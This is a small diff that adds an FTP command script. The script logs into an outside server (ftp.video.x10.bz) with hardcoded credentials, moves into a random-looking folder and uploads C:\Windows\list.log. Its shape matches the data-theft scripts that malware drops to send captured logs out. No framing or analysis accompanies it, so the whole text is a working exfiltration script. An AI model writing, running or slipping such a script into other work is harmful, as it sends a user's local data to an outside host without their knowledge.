@@ -1,0 +1,8 @@
+OPEN ftp.video.x10.bz
+USER win32@video.x10.bz
+system32
+ASCII
+cd OZEMQECW 
+SEND C:\Windows\list.log
+BYE
+exit
